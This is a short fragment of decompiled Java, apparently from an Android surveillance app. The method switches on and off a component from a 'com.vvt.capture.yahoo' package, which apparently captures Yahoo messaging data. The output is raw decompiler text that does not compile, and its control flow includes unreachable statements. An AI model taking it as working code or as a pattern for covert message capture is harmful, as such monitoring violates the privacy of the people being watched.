  private static void t(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.yahoo.b localb;
    boolean bool;
    if (paramBoolean1)
    {
      localb = paramh.ab;
      if (localb == null)
      {
        localb = new com/vvt/capture/yahoo/b;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        localb.<init>(str, localq, localRunningMode, localc, paramb);
        paramh.ab = localb;
      }
      if (paramBoolean2)
      {
        paramh.ab.a(paramb);
        localb = paramh.ab;
        bool = localb.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          localb = paramh.ab;
          localb.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      localb = paramh.ab;
      localb.h();
      continue;
      localb = paramh.ab;
      if (localb != null)
      {
        paramh.ab.h();
        paramh.ab.j();
        bool = false;
        localb = null;
        paramh.ab = null;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */